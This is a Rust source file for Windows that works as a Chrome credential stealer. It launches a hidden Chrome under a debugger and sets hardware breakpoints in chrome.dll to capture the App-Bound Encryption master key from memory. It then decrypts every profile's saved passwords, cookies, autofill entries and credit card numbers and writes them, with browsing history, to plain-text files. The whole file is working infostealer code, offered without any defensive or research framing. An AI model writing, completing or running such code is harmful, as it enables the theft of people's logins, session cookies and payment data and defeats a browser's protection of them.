#![allow(non_snake_case)]

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::Diagnostics::Debug::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::LibraryLoader::*;
use windows_sys::Win32::System::ProcessStatus::*;
use windows_sys::Win32::Storage::FileSystem::*;
use windows_sys::Win32::Security::*;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use windows_sys::Win32::UI::WindowsAndMessaging::*;
use std::ptr::{null, null_mut};
use std::mem::{size_of, zeroed};
use std::path::{Path, PathBuf};
use std::fs;
use std::io::Write;
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use rusqlite::{Connection};
use chrono::{Utc, TimeZone};

// Some missing definitions from windows-sys that might be architecture specific or in other modules
#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_DOS_HEADER {
    pub e_magic: u16,
    pub e_cblp: u16,
    pub e_cp: u16,
    pub e_crlc: u16,
    pub e_cparhdr: u16,
    pub e_minalloc: u16,
    pub e_maxalloc: u16,
    pub e_ss: u16,
    pub e_sp: u16,
    pub e_csum: u16,
    pub e_ip: u16,
    pub e_cs: u16,
    pub e_lfarlc: u16,
    pub e_ovno: u16,
    pub e_res: [u16; 4],
    pub e_oemid: u16,
    pub e_oeminfo: u16,
    pub e_res2: [u16; 10],
    pub e_lfanew: i32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_SECTION_HEADER {
    pub Name: [u8; 8],
    pub Misc: IMAGE_SECTION_HEADER_0,
    pub VirtualAddress: u32,
    pub SizeOfRawData: u32,
    pub PointerToRawData: u32,
    pub PointerToRelocations: u32,
    pub PointerToLinenumbers: u32,
    pub NumberOfRelocations: u16,
    pub NumberOfLinenumbers: u16,
    pub Characteristics: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub union IMAGE_SECTION_HEADER_0 {
    pub PhysicalAddress: u32,
    pub VirtualSize: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_FILE_HEADER {
    pub Machine: u16,
    pub NumberOfSections: u16,
    pub TimeDateStamp: u32,
    pub PointerToSymbolTable: u32,
    pub NumberOfSymbols: u32,
    pub SizeOfOptionalHeader: u16,
    pub Characteristics: u16,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_DATA_DIRECTORY {
    pub VirtualAddress: u32,
    pub Size: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_OPTIONAL_HEADER64 {
    pub Magic: u16,
    pub MajorLinkerVersion: u8,
    pub MinorLinkerVersion: u8,
    pub SizeOfCode: u32,
    pub SizeOfInitializedData: u32,
    pub SizeOfUninitializedData: u32,
    pub AddressOfEntryPoint: u32,
    pub BaseOfCode: u32,
    pub ImageBase: u64,
    pub SectionAlignment: u32,
    pub FileAlignment: u32,
    pub MajorOperatingSystemVersion: u16,
    pub MinorOperatingSystemVersion: u16,
    pub MajorImageVersion: u16,
    pub MinorImageVersion: u16,
    pub MajorSubsystemVersion: u16,
    pub MinorSubsystemVersion: u16,
    pub Win32VersionValue: u32,
    pub SizeOfImage: u32,
    pub SizeOfHeaders: u32,
    pub CheckSum: u32,
    pub Subsystem: u16,
    pub DllCharacteristics: u16,
    pub SizeOfStackReserve: u64,
    pub SizeOfStackCommit: u64,
    pub SizeOfHeapReserve: u64,
    pub SizeOfHeapCommit: u64,
    pub LoaderFlags: u32,
    pub NumberOfRvaAndSizes: u32,
    pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_NT_HEADERS64 {
    pub Signature: u32,
    pub FileHeader: IMAGE_FILE_HEADER,
    pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

// X64 Context
#[repr(C)]
#[cfg(target_arch = "x86_64")]
#[derive(Copy, Clone)]
pub struct CONTEXT {
    pub P1Home: u64,
    pub P2Home: u64,
    pub P3Home: u64,
    pub P4Home: u64,
    pub P5Home: u64,
    pub P6Home: u64,
    pub ContextFlags: u32,
    pub MxCsr: u32,
    pub SegCs: u16,
    pub SegDs: u16,
    pub SegEs: u16,
    pub SegFs: u16,
    pub SegGs: u16,
    pub SegSs: u16,
    pub EFlags: u32,
    pub Dr0: u64,
    pub Dr1: u64,
    pub Dr2: u64,
    pub Dr3: u64,
    pub Dr6: u64,
    pub Dr7: u64,
    pub Rax: u64,
    pub Rcx: u64,
    pub Rdx: u64,
    pub Rbx: u64,
    pub Rsp: u64,
    pub Rbp: u64,
    pub Rsi: u64,
    pub Rdi: u64,
    pub R8: u64,
    pub R9: u64,
    pub R10: u64,
    pub R11: u64,
    pub R12: u64,
    pub R13: u64,
    pub R14: u64,
    pub R15: u64,
    pub Rip: u64,
    pub Anonymous: CONTEXT_0,
    pub VectorRegister: [M128A; 26],
    pub VectorControl: u64,
    pub DebugControl: u64,
    pub LastBranchToRip: u64,
    pub LastBranchFromRip: u64,
    pub LastExceptionToRip: u64,
    pub LastExceptionFromRip: u64,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub union CONTEXT_0 {
    pub FltSave: XSAVE_FORMAT,
    pub Anonymous: CONTEXT_0_0,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct CONTEXT_0_0 {
    pub Header: [M128A; 2],
    pub Legacy: [M128A; 8],
    pub Xmm0: M128A,
    pub Xmm1: M128A,
    pub Xmm2: M128A,
    pub Xmm3: M128A,
    pub Xmm4: M128A,
    pub Xmm5: M128A,
    pub Xmm6: M128A,
    pub Xmm7: M128A,
    pub Xmm8: M128A,
    pub Xmm9: M128A,
    pub Xmm10: M128A,
    pub Xmm11: M128A,
    pub Xmm12: M128A,
    pub Xmm13: M128A,
    pub Xmm14: M128A,
    pub Xmm15: M128A,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct M128A {
    pub Low: u64,
    pub High: i64,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct XSAVE_FORMAT {
    pub ControlWord: u16,
    pub StatusWord: u16,
    pub TagWord: u8,
    pub Reserved1: u8,
    pub ErrorOpcode: u16,
    pub ErrorOffset: u32,
    pub ErrorSelector: u16,
    pub Reserved2: u16,
    pub DataOffset: u32,
    pub DataSelector: u16,
    pub Reserved3: u16,
    pub MxCsr: u32,
    pub MxCsr_Mask: u32,
    pub FloatRegisters: [M128A; 8],
    pub XmmRegisters: [M128A; 16],
    pub Reserved4: [u8; 96],
}

pub const CONTEXT_AMD64: u32 = 0x00100000;
pub const CONTEXT_CONTROL: u32 = CONTEXT_AMD64 | 0x00000001;
pub const CONTEXT_INTEGER: u32 = CONTEXT_AMD64 | 0x00000002;
pub const CONTEXT_SEGMENTS: u32 = CONTEXT_AMD64 | 0x00000004;
pub const CONTEXT_FLOATING_POINT: u32 = CONTEXT_AMD64 | 0x00000008;
pub const CONTEXT_DEBUG_REGISTERS: u32 = CONTEXT_AMD64 | 0x00000010;
pub const CONTEXT_FULL: u32 = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;

#[link(name = "kernel32")]
extern "system" {
    pub fn TerminateProcess(hprocess: HANDLE, uexitcode: u32) -> BOOL;
    pub fn CreateProcessW(
        lpapplicationname: *const u16,
        lpcommandline: *mut u16,
        lpprocessattributes: *const SECURITY_ATTRIBUTES,
        lpthreadattributes: *const SECURITY_ATTRIBUTES,
        binherithandles: BOOL,
        dwcreationflags: PROCESS_CREATION_FLAGS,
        lpenvironment: *const std::ffi::c_void,
        lpcurrentdirectory: *const u16,
        lpstartupinfo: *const STARTUPINFOW,
        lpprocessinformation: *mut PROCESS_INFORMATION,
    ) -> BOOL;
    pub fn GetThreadContext(hthread: HANDLE, lpcontext: *mut CONTEXT) -> BOOL;
    pub fn SetThreadContext(hthread: HANDLE, lpcontext: *const CONTEXT) -> BOOL;
}

fn main() {
    let user_data_dir = match get_user_data_dir() {
        Some(d) => d,
        None => return,
    };

    // Create a temporary User Data directory to force a new browser instance even if Chrome is open
    let temp_user_dir = std::env::temp_dir().join(format!("chrome_temp_profile_{}", rand::random::<u32>()));
    let _ = fs::create_dir_all(&temp_user_dir);

    // Copy Local State so it has the same encrypted key
    let local_state = user_data_dir.join("Local State");
    if local_state.exists() {
        let _ = fs::copy(&local_state, temp_user_dir.join("Local State"));
    }

    // Discover profiles and pick the first one to seed the temp directory
    let profiles = discover_profiles(&user_data_dir);
    if let Some(profile_name) = profiles.first() {
        let real_profile = user_data_dir.join(profile_name);
        let temp_default = temp_user_dir.join("Default");
        let _ = fs::create_dir_all(&temp_default);

        // Copy essential files to trigger key decryption
        for file in &["Login Data", "Preferences", "Cookies"] {
            let src = real_profile.join(file);
            if src.exists() {
                let _ = fs::copy(&src, temp_default.join(file));
            }
        }
        // Also Network/Cookies
        let net_cookies = real_profile.join("Network").join("Cookies");
        if net_cookies.exists() {
            let _ = fs::create_dir_all(temp_default.join("Network"));
            let _ = fs::copy(&net_cookies, temp_default.join("Network").join("Cookies"));
        }
    }

    unsafe {
        let mut si: STARTUPINFOW = zeroed();
        si.cb = size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE as u16;

        let mut pi: PROCESS_INFORMATION = zeroed();

        // Remove --headless as it may bypass the UI thread initialization needed for key decryption
        let cmd_str = format!(
            "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --user-data-dir=\"{}\" --no-first-run --no-default-browser-check\0",
            temp_user_dir.to_str().unwrap_or("")
        );
        let mut chrome_cmd: Vec<u16> = cmd_str.encode_utf16().collect();

        let success = CreateProcessW(
            null(),
            chrome_cmd.as_mut_ptr(),
            null(),
            null(),
            FALSE,
            DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW,
            null(),
            null(),
            &si,
            &mut pi,
        );

        if success == 0 {
            eprintln!("Failed to create Chrome process: {}", GetLastError());
            return;
        }

        println!("Started Chrome with PID: {}", pi.dwProcessId);

        debug_loop(pi.hProcess);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    let _ = fs::remove_dir_all(temp_user_dir);
}

unsafe fn debug_loop(h_process: HANDLE) {
    let mut debug_event: DEBUG_EVENT = zeroed();
    let mut chrome_dll_base: *mut std::ffi::c_void = null_mut();
    let mut target_address: usize = 0;
    let mut loop_count = 0;

    loop {
        if WaitForDebugEvent(&mut debug_event, 5000) == 0 {
            if target_address != 0 {
                println!("Waiting for v20 masterkey decryption (heartbeat #{})...", loop_count);
                loop_count += 1;
            }
            continue;
        }

        match debug_event.dwDebugEventCode {
            LOAD_DLL_DEBUG_EVENT => {
                let load_dll = debug_event.u.LoadDll;
                let mut buffer = [0u16; 260];
                let len = GetFinalPathNameByHandleW(load_dll.hFile, buffer.as_mut_ptr(), buffer.len() as u32, 0);
                if len > 0 {
                    let path = String::from_utf16_lossy(&buffer[..len as usize]);
                    if path.contains("chrome.dll") {
                        println!("Found chrome.dll at {:?}", load_dll.lpBaseOfDll);
                        chrome_dll_base = load_dll.lpBaseOfDll;
                        target_address = find_target_address(h_process, chrome_dll_base);
                        if target_address != 0 {
                            let threads = get_all_threads(debug_event.dwProcessId);
                            println!("Setting hardware breakpoints on {} threads", threads.len());
                            for thread_id in threads {
                                set_hardware_breakpoint(thread_id, target_address);
                            }
                        }
                    }
                }
            }
            CREATE_THREAD_DEBUG_EVENT => {
                if target_address != 0 {
                    set_hardware_breakpoint(debug_event.dwThreadId, target_address);
                }
            }
            EXCEPTION_DEBUG_EVENT => {
                let exception = debug_event.u.Exception;
                if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
                    let addr = exception.ExceptionRecord.ExceptionAddress as usize;
                    if addr == target_address {
                        println!("Target breakpoint hit at 0x{:X}!", addr);
                        if extract_key(debug_event.dwThreadId, h_process) {
                            clear_hardware_breakpoints(debug_event.dwProcessId);
                            terminate_chrome(h_process);
                        } else {
                            println!("Extraction failed at 0x{:X}, waiting for next hit...", addr);
                        }
                    }
                    set_resume_flag(debug_event.dwThreadId);
                }
            }
            EXIT_PROCESS_DEBUG_EVENT => {
                break;
            }
            _ => {}
        }

        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
    }
}

unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_void) -> usize {
    let mut dos_header: IMAGE_DOS_HEADER = zeroed();
    let mut bytes_read = 0;
    if ReadProcessMemory(h_process, base_addr, &mut dos_header as *mut _ as *mut _, size_of::<IMAGE_DOS_HEADER>(), &mut bytes_read) == 0 {
        return 0;
    }

    let nt_headers_ptr = (base_addr as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    let mut nt_headers: IMAGE_NT_HEADERS64 = zeroed();
    if ReadProcessMemory(h_process, nt_headers_ptr as *const _, &mut nt_headers as *mut _ as *mut _, size_of::<IMAGE_NT_HEADERS64>(), &mut bytes_read) == 0 {
        return 0;
    }

    let section_count = nt_headers.FileHeader.NumberOfSections;
    let mut sections = Vec::with_capacity(section_count as usize);
    let section_header_ptr = (nt_headers_ptr as usize + size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;

    for i in 0..section_count {
        let mut section: IMAGE_SECTION_HEADER = zeroed();
        ReadProcessMemory(h_process, (section_header_ptr as usize + i as usize * size_of::<IMAGE_SECTION_HEADER>()) as *const _, &mut section as *mut _ as *mut _, size_of::<IMAGE_SECTION_HEADER>(), &mut bytes_read);
        sections.push(section);
    }

    let target_string = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
    let mut string_va = 0;

    for section in &sections {
        let name = std::str::from_utf8(&section.Name).unwrap_or("").trim_matches('\0');
        if name == ".rdata" {
            let section_data = read_process_memory_chunk(h_process, (base_addr as usize + section.VirtualAddress as usize) as *const _, section.Misc.VirtualSize as usize);
            if let Some(pos) = find_subsequence(&section_data, target_string.as_bytes()) {
                string_va = base_addr as usize + section.VirtualAddress as usize + pos;
                break;
            }
        }
    }

    if string_va == 0 { return 0; }

    for section in &sections {
        let name = std::str::from_utf8(&section.Name).unwrap_or("").trim_matches('\0');
        if name == ".text" {
            let section_start = base_addr as usize + section.VirtualAddress as usize;
            let section_data = read_process_memory_chunk(h_process, section_start as *const _, section.Misc.VirtualSize as usize);

            let mut pos = 0;
            while pos + 7 <= section_data.len() {
                if section_data[pos..pos+3] == [0x48, 0x8D, 0x0D] {
                    let offset = i32::from_le_bytes(section_data[pos+3..pos+7].try_into().unwrap());
                    let rip = section_start + pos + 7;
                    let target = (rip as i64 + offset as i64) as usize;

                    if target == string_va {
                        println!("Found matching LEA instruction at 0x{:X}", section_start + pos);
                        return section_start + pos;
                    }
                }
                pos += 1;
            }
        }
    }

    0
}

fn read_process_memory_chunk(h_process: HANDLE, addr: *const std::ffi::c_void, size: usize) -> Vec<u8> {
    let mut buffer = vec![0u8; size];
    let mut bytes_read = 0;
    unsafe {
        ReadProcessMemory(h_process, addr, buffer.as_mut_ptr() as *mut _, size, &mut bytes_read);
    }
    buffer
}

fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|window| window == needle)
}

unsafe fn get_all_threads(process_id: u32) -> Vec<u32> {
    let mut threads = Vec::new();
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snapshot != INVALID_HANDLE_VALUE {
        let mut te: THREADENTRY32 = zeroed();
        te.dwSize = size_of::<THREADENTRY32>() as u32;
        if Thread32First(snapshot, &mut te) != 0 {
            loop {
                if te.th32OwnerProcessID == process_id {
                    threads.push(te.th32ThreadID);
                }
                if Thread32Next(snapshot, &mut te) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
    threads
}

unsafe fn set_resume_flag(thread_id: u32) {
    let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if h_thread == 0 {
        return;
    }

    SuspendThread(h_thread);

    let mut context: CONTEXT = zeroed();
    context.ContextFlags = CONTEXT_CONTROL;
    if GetThreadContext(h_thread, &mut context) != 0 {
        context.EFlags |= 0x10000; // Set RF (Resume Flag)
        SetThreadContext(h_thread, &context);
    }

    ResumeThread(h_thread);
    CloseHandle(h_thread);
}

unsafe fn clear_hardware_breakpoints(process_id: u32) {
    let threads = get_all_threads(process_id);
    for thread_id in threads {
        let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
        if h_thread != 0 {
            SuspendThread(h_thread);
            let mut context: CONTEXT = zeroed();
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if GetThreadContext(h_thread, &mut context) != 0 {
                context.Dr0 = 0;
                context.Dr7 &= !0b11; // Disable DR0
                SetThreadContext(h_thread, &context);
            }
            ResumeThread(h_thread);
            CloseHandle(h_thread);
        }
    }
}

unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
    let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if h_thread == 0 {
        return;
    }

    SuspendThread(h_thread);

    let mut context: CONTEXT = zeroed();
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if GetThreadContext(h_thread, &mut context) != 0 {
        context.Dr0 = address as u64;
        context.Dr7 = (context.Dr7 & !0b11) | 0b01; // Enable DR0 local
        SetThreadContext(h_thread, &context);
    }

    ResumeThread(h_thread);
    CloseHandle(h_thread);
}

fn get_user_data_dir() -> Option<PathBuf> {
    let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
    let path = Path::new(&local_app_data)
        .join("Google")
        .join("Chrome")
        .join("User Data");
    if path.exists() {
        Some(path)
    } else {
        None
    }
}

fn discover_profiles(user_data_dir: &Path) -> Vec<String> {
    let mut profiles = Vec::new();
    if let Ok(entries) = fs::read_dir(user_data_dir) {
        for entry in entries.flatten() {
            if let Ok(file_type) = entry.file_type() {
                if file_type.is_dir() {
                    let profile_path = entry.path();
                    if profile_path.join("Preferences").exists() {
                        if let Some(name) = entry.file_name().to_str() {
                            profiles.push(name.to_string());
                        }
                    }
                }
            }
        }
    }
    profiles
}

fn copy_and_open_db(db_path: &Path) -> Option<(Connection, PathBuf)> {
    let base_name = format!("chrome_tmp_{}", rand::random::<u32>());
    let temp_db = std::env::temp_dir().join(&base_name);

    if let Err(_) = fs::copy(db_path, &temp_db) {
        return None;
    }

    // Attempt to copy WAL and SHM files if they exist
    let wal = db_path.with_extension("wal");
    if wal.exists() {
        let _ = fs::copy(&wal, temp_db.with_extension("wal"));
    }
    let shm = db_path.with_extension("shm");
    if shm.exists() {
        let _ = fs::copy(&shm, temp_db.with_extension("shm"));
    }

    match Connection::open(&temp_db) {
        Ok(conn) => Some((conn, temp_db)),
        Err(_) => {
            let _ = fs::remove_file(&temp_db);
            let _ = fs::remove_file(temp_db.with_extension("wal"));
            let _ = fs::remove_file(temp_db.with_extension("shm"));
            None
        }
    }
}

fn extract_passwords(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
    let db_path = profile_path.join("Login Data");
    if !db_path.exists() { return; }

    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
        if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
            let mut file = fs::File::create(output_dir.join("passwords.txt")).unwrap();
            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?))).unwrap();

            for row in rows.flatten() {
                let (url, user, blob) = row;
                if blob.starts_with(b"v20") && blob.len() > 15 {
                    let nonce = Nonce::from_slice(&blob[3..15]);
                    if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
                        // Strip the App-Bound header/signature (first 32 bytes of plaintext)
                        let plain = if dec.len() > 32 { &dec[32..] } else { &dec };
                        writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, String::from_utf8_lossy(plain)).unwrap();
                    }
                }
            }
        }
        let _ = fs::remove_file(&temp_path);
        let _ = fs::remove_file(temp_path.with_extension("wal"));
        let _ = fs::remove_file(temp_path.with_extension("shm"));
    }
}

fn extract_cookies(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
    let mut db_path = profile_path.join("Network").join("Cookies");
    if !db_path.exists() {
        db_path = profile_path.join("Cookies");
    }
    if !db_path.exists() { return; }

    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
        if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
            let mut file = fs::File::create(output_dir.join("cookies.txt")).unwrap();
            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?))).unwrap();

            for row in rows.flatten() {
                let (host, name, blob) = row;
                if blob.starts_with(b"v20") && blob.len() > 15 {
                    let nonce = Nonce::from_slice(&blob[3..15]);
                    if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
                        // Strip the App-Bound header/signature (first 32 bytes of plaintext)
                        let plain = if dec.len() > 32 { &dec[32..] } else { &dec };
                        let value = if let Ok(s) = std::str::from_utf8(plain) {
                            s.to_string()
                        } else {
                            format!("(hex) {}", hex::encode(plain))
                        };
                        writeln!(file, "Host: {} | Name: {} | Value: {}", host, name, value).unwrap();
                    }
                }
            }
        }
        let _ = fs::remove_file(&temp_path);
        let _ = fs::remove_file(temp_path.with_extension("wal"));
        let _ = fs::remove_file(temp_path.with_extension("shm"));
    }
}

fn extract_autofill(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
    let db_path = profile_path.join("Web Data");
    if !db_path.exists() { return; }

    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
        let mut file = fs::File::create(output_dir.join("autofill.txt")).unwrap();

        // Modern Autofill (names, emails, phones, addresses tables)
        if let Ok(mut stmt) = conn.prepare("SELECT guid, full_name FROM autofill_profile_names") {
            if let Ok(rows) = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))) {
                for row in rows.flatten() {
                    writeln!(file, "Autofill Name [{}]: {}", row.0, row.1).unwrap();
                }
            }
        }
        if let Ok(mut stmt) = conn.prepare("SELECT guid, email FROM autofill_profile_emails") {
            if let Ok(rows) = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))) {
                for row in rows.flatten() {
                    writeln!(file, "Autofill Email [{}]: {}", row.0, row.1).unwrap();
                }
            }
        }

        // Fallback for older structures
        if let Ok(mut stmt) = conn.prepare("SELECT name_first, name_last, street_address, city, zipcode, email FROM autofill_profiles") {
            if let Ok(rows) = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, String>(2)?, row.get::<_, String>(3)?, row.get::<_, String>(4)?, row.get::<_, String>(5)?))) {
                for row in rows.flatten() {
                    writeln!(file, "Legacy Profile: {} {} | {}, {}, {} | Email: {}", row.0, row.1, row.2, row.3, row.4, row.5).unwrap();
                }
            }
        }

        // Credit Cards
        if let Ok(mut stmt) = conn.prepare("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards") {
            if let Ok(rows) = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, i32>(1)?, row.get::<_, i32>(2)?, row.get::<_, Vec<u8>>(3)?))) {
                for row in rows.flatten() {
                    let (name, m, y, blob) = row;
                    if blob.starts_with(b"v20") && blob.len() > 15 {
                        let nonce = Nonce::from_slice(&blob[3..15]);
                        if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
                            let plain = if dec.len() > 32 { &dec[32..] } else { &dec };
                            writeln!(file, "Card: {} | Exp: {}/{} | Num: {}", name, m, y, String::from_utf8_lossy(plain)).unwrap();
                        }
                    }
                }
            }
        }
        let _ = fs::remove_file(&temp_path);
        let _ = fs::remove_file(temp_path.with_extension("wal"));
        let _ = fs::remove_file(temp_path.with_extension("shm"));
    }
}

fn extract_history(profile_path: &Path, output_dir: &Path) {
    let db_path = profile_path.join("History");
    if !db_path.exists() { return; }

    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
        if let Ok(mut stmt) = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500") {
            let mut file = fs::File::create(output_dir.join("history.txt")).unwrap();
            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, i32>(2)?, row.get::<_, i64>(3)?))).unwrap();

            for row in rows.flatten() {
                let (url, title, count, time) = row;
                // Webkit epoch (microseconds since Jan 1, 1601) to UTC
                let unix_time = (time / 1_000_000) - 11_644_473_600;
                let dt = Utc.timestamp_opt(unix_time, 0).single();
                let time_str = match dt {
                    Some(d) => d.format("%Y-%m-%d %H:%M:%S").to_string(),
                    None => "unknown".to_string(),
                };
                writeln!(file, "[{}] URL: {} | Title: {} | Visits: {}", time_str, url, title, count).unwrap();
            }
        }
        let _ = fs::remove_file(&temp_path);
        let _ = fs::remove_file(temp_path.with_extension("wal"));
        let _ = fs::remove_file(temp_path.with_extension("shm"));
    }
}

fn extract_all_profiles_data(master_key: &[u8; 32]) {
    let user_data_dir = match get_user_data_dir() {
        Some(d) => d,
        None => return,
    };

    let profiles = discover_profiles(&user_data_dir);
    let extract_root = Path::new("chrome_extract");
    let _ = fs::create_dir_all(extract_root);

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));

    for profile_name in profiles {
        println!("Extracting data for profile: {}", profile_name);
        let profile_path = user_data_dir.join(&profile_name);
        let output_dir = extract_root.join(&profile_name);
        let _ = fs::create_dir_all(&output_dir);

        extract_passwords(&profile_path, &output_dir, &cipher);
        extract_cookies(&profile_path, &output_dir, &cipher);
        extract_autofill(&profile_path, &output_dir, &cipher);
        extract_history(&profile_path, &output_dir);
    }
    println!("Extraction complete. Data saved in chrome_extract folder.");
}

unsafe fn terminate_chrome(h_process: HANDLE) {
    println!("Closing Chrome...");
    TerminateProcess(h_process, 0);
}

unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
    let h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id);
    if h_thread == 0 {
        return false;
    }

    let mut success = false;
    let mut context: CONTEXT = zeroed();
    context.ContextFlags = CONTEXT_FULL;
    if GetThreadContext(h_thread, &mut context) != 0 {
        let key_ptrs = vec![context.R15, context.R14];
        for &ptr in &key_ptrs {
            if ptr == 0 {
                println!("Register was NULL, skipping...");
                continue;
            }
            let mut buffer = [0u8; 32];
            let mut bytes_read = 0;
            if ReadProcessMemory(h_process, ptr as *const _, buffer.as_mut_ptr() as *mut _, buffer.len(), &mut bytes_read) != 0 {
                let mut data_ptr = ptr;
                let length = u64::from_le_bytes(buffer[8..16].try_into().unwrap_or([0; 8]));
                if length == 32 {
                    data_ptr = u64::from_le_bytes(buffer[0..8].try_into().unwrap_or([0; 8]));
                }

                let mut key = [0u8; 32];
                if ReadProcessMemory(h_process, data_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
                    if key.iter().any(|&b| b != 0) {
                        println!("Extracted Master Key from 0x{:X}", data_ptr);
                        extract_all_profiles_data(&key);
                        success = true;
                        break;
                    }
                }
            }
        }
    }

    CloseHandle(h_thread);
    success
}
